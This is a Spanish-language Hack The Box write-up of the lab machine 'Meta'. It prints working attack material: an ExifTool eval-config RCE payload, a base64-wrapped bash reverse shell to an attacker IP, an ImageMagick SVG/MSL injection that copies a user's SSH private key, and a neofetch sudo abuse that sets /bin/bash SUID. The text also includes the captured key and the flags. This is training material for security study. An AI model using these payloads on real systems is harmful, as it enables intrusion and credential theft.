---
layout: single
title: Meta - Hack The Box
excerpt: "En este post vamos a estar haciendo la maquina Meta de la plataforma de Hackthebox donde vamos a tener que aprovecharnos de que en un subdominio están empleando Exiftool para poder asi subir una imagen y convertirlo en una ejecución remota de comandos y ganar acceso con www-data despues abusaremos de ImageMagick para obtener la id_rsa de un usuario y conectarnos por SSH para la escalada de privilegios abusaremos de que podemos correr como root sin proporcionar contraseña neofetch"
date: 2023-06-19
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/htb-writeup-meta/icon.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:  
  - ImageMagick Exploitation
  - Abusing Neofetch
  - Subdomain Enumeration
  - Exiftool Exploitation RCE
---

⮕ Maquina Linux

![](/assets/images/htb-writeup-meta/intro.png)

```bash
❯ ping -c 1 10.10.11.140
PING 10.10.11.140 (10.10.11.140) 56(84) bytes of data.
64 bytes from 10.10.11.140: icmp_seq=1 ttl=63 time=115 ms

--- 10.10.11.140 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 114.814/114.814/114.814/0.000 ms
❯ whichSystem.py 10.10.11.140

10.10.11.140 (ttl -> 63): Linux

```

## PortScan 

```bash
❯ nmap -sCV -p22,80 10.10.11.140 -oG targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-18 18:01 CST
Nmap scan report for 10.10.11.140
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 1281175a5ac9c600dbf0ed9364fd1e08 (RSA)
|   256 b5e55953001896a6f842d8c7fb132049 (ECDSA)
|_  256 05e9df71b59f25036bd0468d05454420 (ED25519)
80/tcp open  http    Apache httpd
|_http-server-header: Apache
|_http-title: Did not follow redirect to http://artcorp.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeracion artcorp.htb 

Ahora vamos agregar el subdominio al `/etc/hosts`  

```bash
❯ echo "10.10.11.140 artcorp.htb" | sudo tee -a /etc/hosts
10.10.11.140 artcorp.htb
❯ ping -c 1 10.10.11.140
PING 10.10.11.140 (10.10.11.140) 56(84) bytes of data.
64 bytes from 10.10.11.140: icmp_seq=1 ttl=63 time=110 ms

--- 10.10.11.140 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 109.935/109.935/109.935/0.000 ms
```

Esta es la pagina web 

![](/assets/images/htb-writeup-meta/web1.png)

Si inspeccionamos vemos varios usuarios en la pagina web que conforman el equipo de trabajo de primeras a mi me interesaría **Thomas** ya que su rol es **PHP Developer** y lo mas problema es que sea un usuario que pertenezca ala maquina victima 

![](/assets/images/htb-writeup-meta/web2.png)

También nos están hablando sobre que van a sacar un nuevo producto **MetaView** 

Al no ver nada mas interesante vamos a proceder a realizar **Fuzzing** para encontrar otras rutas de interés, pero nada interesante encontramos por los códigos de estado en las respuestas

```bash
❯ dirsearch -u http://10.10.11.140

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10903

Output File: /usr/lib/python3/dist-packages/dirsearch/reports/10.10.11.140/_23-06-18_18-14-31.txt

Error Log: /usr/lib/python3/dist-packages/dirsearch/logs/errors-23-06-18_18-14-31.log

Target: http://10.10.11.140/

[18:14:31] Starting: 
[18:14:37] 403 -  199B  - /.ht_wsr.txt
[18:14:37] 403 -  199B  - /.htaccess.bak1
[18:14:37] 403 -  199B  - /.htaccess.orig
[18:14:37] 403 -  199B  - /.htaccess.save
[18:14:37] 403 -  199B  - /.htaccess.sample
[18:14:37] 403 -  199B  - /.htaccess_extra
[18:14:37] 403 -  199B  - /.htaccess_orig
[18:14:37] 403 -  199B  - /.htaccess_sc
[18:14:37] 403 -  199B  - /.htaccessBAK
[18:14:37] 403 -  199B  - /.htaccessOLD
[18:14:37] 403 -  199B  - /.htaccessOLD2
[18:14:37] 403 -  199B  - /.htm
[18:14:37] 403 -  199B  - /.html
[18:14:37] 403 -  199B  - /.htpasswd_test
[18:14:37] 403 -  199B  - /.htpasswds
[18:14:37] 403 -  199B  - /.httr-oauth
[18:14:39] 403 -  199B  - /.php
[18:15:20] 301 -    0B  - /index.php  ->  http://artcorp.htb
[18:15:20] 301 -    0B  - /index.php/login/  ->  http://artcorp.htb
[18:15:37] 403 -  199B  - /server-status
[18:15:37] 403 -  199B  - /server-status/

Task Completed
```

Vamos a hacer **Fuzzing** pero ahora para buscar si hay algún otro **subdominio** por que nos hablaban sobre un proyecto tal vez podemos encontrar algo

```bash
❯ gobuster vhost -u http://artcorp.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r -t 50
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://artcorp.htb
[+] Method:       GET
[+] Threads:      50
[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2023/06/18 18:17:11 Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev01.artcorp.htb (Status: 200) [Size: 247]
```

Vamos agregar al `/etc/hosts` el nuevo subdominio  

```bash
❯ cat /etc/hosts | tail -n 1
10.10.11.140 artcorp.htb dev01.artcorp.htb
❯ ping -c 1 dev01.artcorp.htb
PING artcorp.htb (10.10.11.140) 56(84) bytes of data.
64 bytes from artcorp.htb (10.10.11.140): icmp_seq=1 ttl=63 time=112 ms

--- artcorp.htb ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 112.345/112.345/112.345/0.000 ms
```

## Enumeracion dev01.artcorp.htb 

Esta es la pagina web que nos muestran 

![](/assets/images/htb-writeup-meta/web3.png)

Si damos click en `MetaView` nos redirige a esta parte  

![](/assets/images/htb-writeup-meta/web4.png)

Nos están diciendo que podemos subir una imagen y se nos va a mostrar metadatos

![](/assets/images/htb-writeup-meta/info.png)

Vamos a probar subiendo una imagen para ver que es lo que pasa cuando la subamos

![](/assets/images/htb-writeup-meta/web5.png)

Una vez lo subimos vemos que nos muestra este mensaje

![](/assets/images/htb-writeup-meta/web6.png)

Bueno la imagen que subí tenia antes otra extensión voy a subir otra que si tenga una extensión correcta y vemos que pasa esto nos esta mostrando información de la imagen como si empleara **exiftool** por detrás 

![](/assets/images/htb-writeup-meta/web7.png)

Si analizamos la imagen que subimos con **exiftool** vemos que nos reporta algunos datos iguales

```bash
❯ exiftool 2.png
ExifTool Version Number         : 12.16
File Name                       : 2.png
Directory                       : .
File Size                       : 7.7 KiB
File Modification Date/Time     : 2023:06:08 18:33:59-06:00
File Access Date/Time           : 2023:06:08 18:33:59-06:00
File Inode Change Date/Time     : 2023:06:18 18:30:03-06:00
File Permissions                : rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 576
Image Height                    : 38
Bit Depth                       : 8
Color Type                      : RGB
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Pixels Per Unit X               : 3780
Pixels Per Unit Y               : 3780
Pixel Units                     : meters
Image Size                      : 576x38
Megapixels                      : 0.022
```

Si tratamos de subir una imagen con contenido `php` pasa esto 

```bash
❯ catn image.png
<?php system("id"); ?>
```

![](/assets/images/htb-writeup-meta/web8.png)

Si lo convertimos a `base64` para ver ahora que pasa

```bash
❯ echo "<?php system("id"); ?>" | base64
PD9waHAgc3lzdGVtKGlkKTsgPz4K
```

```bash
❯ catn image.png
PD9waHAgc3lzdGVtKGlkKTsgPz4K
```

Nos lo sigue detectando

![](/assets/images/htb-writeup-meta/web9.png)

Bueno después de estar buscando información en Internet de como convertir un **imagen** a un **RCE** aprovechándonos de `exiftool` encontré este repositorio el cual me dio buenos resultados básicamente se están aprovechando de una versión desactualizada de `exiftool` y esta usando la opción `eval` que sirve para ejecutar una expresión evaluada  <https://github.com/OneSecCyber/JPEG_RCE> después de seguir los pasos y subir la imagen que creo paso esto 

```bash
❯ catn eval.config
%Image::ExifTool::UserDefined = (
    'Image::ExifTool::Exif::Main' => {
        0xc51b => {
            Name => 'eval',
            Binary => 1,
            Writable => 'undef',
            WriteGroup => 'IFD0',
            ValueConvInv => sub {
                use MIME::Base64;
                my $val = shift;
                $encoded = encode_base64($val);
                my $meta = qq/(metadata(Copyright "\\\n" eq ''; return (eval { use MIME::Base64; eval(decode_base64(q%$encoded%)); });#"))/;
                my $len = pack "N", length($meta);
                my $payload = qq/AT&TFORM\x00\x00\x00\x08DJVUANTa$len$meta/;
                return $payload;
            }
        }
    }
)
```

![](/assets/images/htb-writeup-meta/web12.png)

```bash
❯ exiftool -config eval.config runme.jpg -eval='system("ls -la")'
    1 image files updated
```

![](/assets/images/htb-writeup-meta/web10.png)

Podemos ejecutar comandos

```bash
❯ exiftool -config eval.config runme.jpg -eval='system("id")'
    1 image files updated
```

![](/assets/images/htb-writeup-meta/web11.png)

## Shell as www-data

Ahora vamos a ganar acceso ala maquina 

```bash
❯ nc -nlvp 443
listening on [any] 443 ...

```

Ahora lo que vamos a hacer es convertir nuestro oneliner en **base64** para que el comando pueda ser interpretado

```bash
❯ echo "bash -c 'bash -i >& /dev/tcp/10.10.14.12/443 0>&1'" | base64
YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMi80NDMgMD4mMScK
```

Ahora usamos **exiftool** pasando la cadena y le indicamos que haga un **decode** e interpreta con **Bash** la cadena

```bash
❯ exiftool -config eval.config runme.jpg -eval='system("echo 'YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMi80NDMgMD4mMScK' |  base64 -d | bash")'
    1 image files updated
```

Ahora subimos la imagen

Y al darla a **Upload** ganamos acceso ala maquina 

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.11.140] 45196
bash: cannot set terminal process group (640): Inappropriate ioctl for device
bash: no job control in this shell
www-data@meta:/var/www/dev01.artcorp.htb/metaview$ whoami
whoami
www-data
www-data@meta:/var/www/dev01.artcorp.htb/metaview$ 
```

Ahora hacemos esto 

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.11.140] 45196
bash: cannot set terminal process group (640): Inappropriate ioctl for device
bash: no job control in this shell
www-data@meta:/var/www/dev01.artcorp.htb/metaview$ whoami
whoami
www-data
www-data@meta:/var/www/dev01.artcorp.htb/metaview$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@meta:/var/www/dev01.artcorp.htb/metaview$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
ENTER
www-data@meta:/var/www/dev01.artcorp.htb/metaview$ export TERM=xterm
```

Ahora nos tenemos que convertir en **Thomas** 

```bash
www-data@meta:/var/www/dev01.artcorp.htb/metaview$ cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/bash
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
thomas:x:1000:1000:thomas,,,:/home/thomas:/bin/bash
www-data@meta:/var/www/dev01.artcorp.htb/metaview$ 
```

Estamos ante un **Debian Buster** 

```bash
www-data@meta:/opt$ lsb_release -a
No LSB modules are available.
Distributor ID:	Debian
Description:	Debian GNU/Linux 10 (buster)
Release:	10
Codename:	buster
www-data@meta:/opt$ 
```

Nada interesante 

```bash
www-data@meta:/$ find / -user  www-data 2>/dev/null | grep -v proc
/var/cache/apache2/mod_cache_disk
/dev/pts/0
/run/lock/apache2
www-data@meta:/$ find \-perm -4000 2>/dev/null
./usr/bin/umount
./usr/bin/newgrp
./usr/bin/passwd
./usr/bin/chsh
./usr/bin/gpasswd
./usr/bin/su
./usr/bin/fusermount
./usr/bin/mount
./usr/bin/chfn
./usr/bin/sudo
./usr/lib/eject/dmcrypt-get-device
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/openssh/ssh-keysign
www-data@meta:/$ 
```

Vamos a subir el `pspy` para ver tareas cron <https://github.com/DominicBreuker/pspy/releases>

```bash
❯ mv /home/miguel7/Descargas/pspy64 .
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.140 - - [18/Jun/2023 19:30:49] "GET /pspy64 HTTP/1.1" 200 -
```

```bash
www-data@meta:/dev/shm$ wget http://10.10.14.12:80/pspy64
--2023-06-18 21:30:48--  http://10.10.14.12/pspy64
Connecting to 10.10.14.12:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: 'pspy64'

pspy64              100%[===================>]   2.96M  52.7KB/s    in 53s     

2023-06-18 21:31:42 (56.8 KB/s) - 'pspy64' saved [3104768/3104768]

www-data@meta:/dev/shm$ 
www-data@meta:/dev/shm$ chmod +x pspy64
```

Al ejecutarlo vemos esto, se esta ejecutando una **bash** para un archivo **.sh**

![](/assets/images/htb-writeup-meta/web13.png)

Este es el contenido, esta utilizando **mogrify** 

```bash
www-data@meta:/usr/local/bin$ cat convert_images.sh 
#!/bin/bash
cd /var/www/dev01.artcorp.htb/convert_images/ && /usr/local/bin/mogrify -format png *.* 2>/dev/null
pkill mogrify
www-data@meta:/usr/local/bin$ 
```

![](/assets/images/htb-writeup-meta/web14.png)

El binario lo esta ejecutando **root**

```bash
www-data@meta:/usr/local/bin$ ls -l /usr/local/bin/mogrify
lrwxrwxrwx 1 root root 6 Aug 29  2021 /usr/local/bin/mogrify -> magick
www-data@meta:/usr/local/bin$ 
```

Podemos ejecutar comandos gracias a eso <https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html>

Como tenemos que convertirnos en el usuario `thomas` para leer la **user.txt** podemos decirle que realice una copia de la **id_rsa** a la ruta **/dev/shm** todo atravez de un archivo **svg**

![](/assets/images/htb-writeup-meta/web15.png)

```bash
www-data@meta:/dev/shm$ nano poc.svg
Unable to create directory /var/www/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

Press Enter to continue

www-data@meta:/dev/shm$ cat poc.svg 
<image authenticate='ff" `cat /home/thomas/.ssh/id_rsa > /dev/shm/id_rsa`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="msl:poc.svg" height="100" width="100"/>
  </svg>
</image>
www-data@meta:/dev/shm$ 
```

Ahora vamos a copear el archivo **.svg** ala ruta donde ejecuta el comando 

```bash
www-data@meta:/dev/shm$ cp poc.svg /var/www/dev01.artcorp.htb/convert_images/
```

Una vez ejecutada la tarea ahora tenemos permisos de lectura de la `id_rsa` de **thomas** y la tenemos en el directorio donde estamos 

```bash
www-data@meta:/dev/shm$ ls -la
total 3040
drwxrwxrwt  2 root     root         100 Jun 18 21:53 .
drwxr-xr-x 16 root     root        3080 Jun 18 19:52 ..
-rw-r--r--  1 thomas   thomas      2590 Jun 18 21:53 id_rsa
-rw-r--r--  1 www-data www-data     419 Jun 18 21:52 poc.svg
-rwxr-xr-x  1 www-data www-data 3104768 Jun 18 21:30 pspy64
www-data@meta:/dev/shm$ 
```

```bash
www-data@meta:/dev/shm$ cat id_rsa 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAt9IoI5gHtz8omhsaZ9Gy+wXyNZPp5jJZvbOJ946OI4g2kRRDHDm5
x7up3z5s/H/yujgjgroOOHh9zBBuiZ1Jn1jlveRM7H1VLbtY8k/rN9PFe/MkRsYdH45IvV
qMgzqmJPFAdxmkD9WRnVP9OqEF0ZEYwTFuFPUlNq5hSbNRucwXEXbW0Wk7xdXwe3OJk8hu
ajeY80riz0S8+A+OywcXZg0HVFVli4/fAvS9Im4VCRmEfA7jwCuh6tl5JMxfi30uzzvke0
yvS1h9asqvkfY5+FX4D9BResbt9AXqm47ajWePksWBoUwhhENLN/1pOgQanK2BR/SC+YkP
nXRkOavHBxHccusftItOQuS0AEza8nfE5ioJmX5O9+fv8ChmnapyryKKn4QR4MAqqTqNIb
7xOWTT7Qmv3vw8TDZYz2dnlAOCc+ONWh8JJZHO9i8BXyHNwAH9qyESB7NlX2zJaAbIZgQs
Xkd7NTUnjOQosPTIDFSPD2EKLt2B1v3D/2DMqtsnAAAFgOcGpkXnBqZFAAAAB3NzaC1yc2
EAAAGBALfSKCOYB7c/KJobGmfRsvsF8jWT6eYyWb2zifeOjiOINpEUQxw5uce7qd8+bPx/
8ro4I4K6Djh4fcwQbomdSZ9Y5b3kTOx9VS27WPJP6zfTxXvzJEbGHR+OSL1ajIM6piTxQH
cZpA/VkZ1T/TqhBdGRGMExbhT1JTauYUmzUbnMFxF21tFpO8XV8HtziZPIbmo3mPNK4s9E
vPgPjssHF2YNB1RVZYuP3wL0vSJuFQkZhHwO48AroerZeSTMX4t9Ls875HtMr0tYfWrKr5
H2OfhV+A/QUXrG7fQF6puO2o1nj5LFgaFMIYRDSzf9aToEGpytgUf0gvmJD510ZDmrxwcR
3HLrH7SLTkLktABM2vJ3xOYqCZl+Tvfn7/AoZp2qcq8iip+EEeDAKqk6jSG+8Tlk0+0Jr9
78PEw2WM9nZ5QDgnPjjVofCSWRzvYvAV8hzcAB/ashEgezZV9syWgGyGYELF5HezU1J4zk
KLD0yAxUjw9hCi7dgdb9w/9gzKrbJwAAAAMBAAEAAAGAFlFwyCmMPkZv0o4Z3aMLPQkSyE
iGLInOdYbX6HOpdEz0exbfswybLtHtJQq6RsnuGYf5X8ThNyAB/gW8tf6f0rYDZtPSNyBc
eCn3+auUXnnaz1rM+77QCGXJFRxqVQCI7ZFRB2TYk4eVn2l0JGsqfrBENiifOfItq37ulv
kroghSgK9SE6jYNgPsp8B2YrgCF+laK6fa89lfrCqPZr0crSpFyop3wsMcC4rVb9m3uhwc
Bsf0BQAHL7Fp0PrzWsc+9AA14ATK4DR/g8JhwQOHzYEoe17iu7/iL7gxDwdlpK7CPhYlL5
Xj6bLPBGmRkszFdXLBPUrlKmWuwLUYoSx8sn3ZSny4jj8x0KoEgHqzKVh4hL0ccJWE8xWS
sLk1/G2x1FxU45+hhmmdG3eKzaRhZpc3hzYZXZC9ypjsFDAyG1ARC679vHnzTI13id29dG
n7JoPVwFv/97UYG2WKexo6DOMmbNuxaKkpetfsqsLAnqLf026UeD1PJYy46kvva1axAAAA
wQCWMIdnyPjk55Mjz3/AKUNBySvL5psWsLpx3DaWZ1XwH0uDzWqtMWOqYjenkyOrI1Y8ay
JfYAm4xkSmOTuEIvcXi6xkS/h67R/GT38zFaGnCHh13/zW0cZDnw5ZNbZ60VfueTcUn9Y3
8ZdWKtVUBsvb23Mu+wMyv87/Ju+GPuXwUi6mOcMy+iOBoFCLYkKaLJzUFngOg7664dUagx
I8qMpD6SQhkD8NWgcwU1DjFfUUdvRv5TnaOhmdNhH2jnr5HaUAAADBAN16q2wajrRH59vw
o2PFddXTIGLZj3HXn9U5W84AIetwxMFs27zvnNYFTd8YqSwBQzXTniwId4KOEmx7rnECoT
qmtSsqzxiKMLarkVJ+4aVELCRutaJPhpRC1nOL9HDKysDTlWNSr8fq2LiYwIku7caFosFM
N54zxGRo5NwbYOAxgFhRJh9DTmhFHJxSnx/6hiCWneRKpG4RCr80fFJMvbTod919eXD0GS
1xsBQdieqiJ66NOalf6uQ6STRxu6A3bwAAAMEA1Hjetdy+Zf0xZTkqmnF4yODqpAIMG9Um
j3Tcjs49usGlHbZb5yhySnucJU0vGpRiKBMqPeysaqGC47Ju/qSlyHnUz2yRPu+kvjFw19
keAmlMNeuMqgBO0guskmU25GX4O5Umt/IHqFHw99mcTGc/veEWIb8PUNV8p/sNaWUckEu9
M4ofDQ3csqhrNLlvA68QRPMaZ9bFgYjhB1A1pGxOmu9Do+LNu0qr2/GBcCvYY2kI4GFINe
bhFErAeoncE3vJAAAACXJvb3RAbWV0YQE=
-----END OPENSSH PRIVATE KEY-----
www-data@meta:/dev/shm$ 
```

## Shell as Thomas 

```bash
❯ nano id_rsa
❯ chmod 600 id_rsa
```

```bash
❯ ssh -i id_rsa thomas@10.10.11.140
The authenticity of host '10.10.11.140 (10.10.11.140)' can't be established.
ECDSA key fingerprint is SHA256:KjNiuFNo5CvSMSQO5ETmw1YJPtafmymn6SkBbMLIAFg.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.140' (ECDSA) to the list of known hosts.
Linux meta 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
thomas@meta:~$  
```

## User flag 

```bash
thomas@meta:~$ export TERM=xterm
thomas@meta:~$ cat user.txt 
82b480f11df535b5238ccc4df49a4d54
thomas@meta:~$ 
```

## Escalada de Privilegios 

Podemos ejecutar esto como **root** sin necesidad de proporcionar contraseña 

```bash
thomas@meta:~$ sudo -l
Matching Defaults entries for thomas on meta:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    env_keep+=XDG_CONFIG_HOME

User thomas may run the following commands on meta:
    (root) NOPASSWD: /usr/bin/neofetch \"\"
thomas@meta:~$ 
```

Si ejecutamos el comando esto lo que hace es como imprimirte por consola información de tu sistema operativo actualmente en uso 

```bash
thomas@meta:~$ neofetch
       _,met$$$$$gg.          thomas@meta 
    ,g$$$$$$$$$$$$$$$P.       ----------- 
  ,g$$P"     """Y$$.".        OS: Debian GNU/Linux 10 (buster) x86_64 
 ,$$P'              `$$$.     Host: VMware Virtual Platform None 
',$$P       ,ggs.     `$$b:   Kernel: 4.19.0-17-amd64 
`d$$'     ,$P"'   .    $$$    Uptime: 2 hours, 6 mins 
 $$P      d$'     ,    $$P    Packages: 495 (dpkg) 
 $$:      $$.   -    ,d$$'    Shell: bash 5.0.3 
 $$;      Y$b._   _,d$P'      Terminal: /dev/pts/1 
 Y$$.    `.`"Y$$$$P"'         CPU: Intel Xeon Gold 5218 (2) @ 2.294GHz 
 `$$b      "-.__              GPU: VMware SVGA II Adapter 
  `Y$$                        Memory: 143MiB / 1994MiB 
   `Y$$.
     `$$b.                                            
       `Y$$b.
          `"Y$b._
              `"""

thomas@meta:~$ 
```

Vemos que aquí esta el directorio de **neofetch**

```bash
thomas@meta:~$ ls -l /home/thomas/.config/
total 4
drwxr-xr-x 2 thomas thomas 4096 Dec 20  2021 neofetch
thomas@meta:~$ 
```

Si nos metemos aquí hay un archivo de configuración

```bash
thomas@meta:~/.config$ cd neofetch/
thomas@meta:~/.config/neofetch$ ls
config.conf
thomas@meta:~/.config/neofetch$ 
```

Como tenemos permisos de escritura en el archivo por que es de **thomas**

Lo que podemos hacer es inyectar un comando para cuando se ejecute el **neofetch** también se ejecute lo que le indiquemos vamos a decirle que ponga la **bash** **SUID** para eso tenemos que editar el archivo y agregarle la linea

Pero antes de eso tenemos que mirar esto, es una variable de entorno 

![](/assets/images/htb-writeup-meta/web16.png)

![](/assets/images/htb-writeup-meta/web17.png)

Vamos a cambiarla para que en vez de que **root** utilice su archivo de configuración utilice el de **thomas**

Ahora si podemos poner la **bash** `SUID` con esto 

```bash
thomas@meta:~/.config/neofetch$ cat config.conf | head -n 3
# See this wiki page for more info:
# https://github.com/dylanaraps/neofetch/wiki/Customizing-Info
chmod u+s /bin/bash
thomas@meta:~/.config/neofetch$ 
thomas@meta:~/.config/neofetch$ export XDG_CONFIG_HOME=/home/thomas/.config/
thomas@meta:~/.config/neofetch$ echo $XDG_CONFIG_HOME
/home/thomas/.config/
thomas@meta:~/.config/neofetch$ 
```

Ahora ejecutamos el **neofetch**

```bash
thomas@meta:~/.config/neofetch$ sudo neofetch
       _,met$$$$$gg.          root@meta 
    ,g$$$$$$$$$$$$$$$P.       --------- 
  ,g$$P"     """Y$$.".        OS: Debian GNU/Linux 10 (buster) x86_64 
 ,$$P'              `$$$.     Host: VMware Virtual Platform None 
',$$P       ,ggs.     `$$b:   Kernel: 4.19.0-17-amd64 
`d$$'     ,$P"'   .    $$$    Uptime: 2 hours, 24 mins 
 $$P      d$'     ,    $$P    Packages: 495 (dpkg) 
 $$:      $$.   -    ,d$$'    Shell: bash 5.0.3 
 $$;      Y$b._   _,d$P'      CPU: Intel Xeon Gold 5218 (2) @ 2.294GHz 
 Y$$.    `.`"Y$$$$P"'         GPU: VMware SVGA II Adapter 
 `$$b      "-.__              Memory: 144MiB / 1994MiB 
  `Y$$
   `Y$$.                                              
     `$$b.
       `Y$$b.
          `"Y$b._
              `"""

thomas@meta:~/.config/neofetch$ 
```

Y la **Bash** es **SUID**

```bash
thomas@meta:~/.config/neofetch$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
thomas@meta:~/.config/neofetch$ 
```

## Shell as root 

```bash
thomas@meta:~/.config/neofetch$ bash -p
bash-5.0# whoami
root
bash-5.0# cd /root
bash-5.0# cat root.txt
97e7c468da6f2a4ba701124f4b69c516
bash-5.0# 
```
